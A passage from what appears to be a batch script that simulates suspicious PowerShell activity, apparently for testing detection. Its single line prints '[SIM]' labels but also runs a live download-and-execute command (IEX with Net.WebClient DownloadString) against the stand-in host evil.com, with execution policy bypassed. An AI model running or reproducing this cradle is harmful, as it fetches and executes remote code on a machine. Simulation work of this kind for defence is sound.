...
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "Write-Host '[SIM] Unusual parent: calc.exe -> powershell.exe'; Write-Host '[SIM] IEX DownloadString from evil.com'; IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
